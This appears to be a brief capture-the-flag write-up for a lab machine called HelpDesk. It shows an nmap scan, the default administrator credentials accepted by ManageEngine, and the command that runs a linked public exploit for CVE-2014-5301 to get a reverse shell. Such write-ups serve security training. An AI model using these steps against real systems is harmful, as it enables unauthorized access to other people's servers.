# HelpDesk

## Summary

* The machine was running a vulnerable version of ManageEngine, which was misconfigured to allow Admin login with the default password.
* Later, I discovered a public authenticated exploit to gain a shell on the box.



## Let's unpack

### Enumeration

```bash
nmap -sC -sN -A -oN nmapFull -p- -A 192.168.166.43

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
```

Enumerating port 8080 that is hosting ManageEngine Service

Misconfiguration found: Manage engine has enabled login using default credentials

<mark style="color:red;">administrator: administrator</mark>

### Initial Foothold

We can use the following exploit to gain a shell on the box. Since it is an authenticated exploit, it requires a username and password, which we already have for this service.

{% embed url="https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py" %}

<pre class="language-bash"><code class="lang-bash"><strong># executing exploit to get reverse shell
</strong>python3 exploit.py 192.168.166.43 8080 administrator administrator shell.war 

> I actually got admin shell!!!
</code></pre>







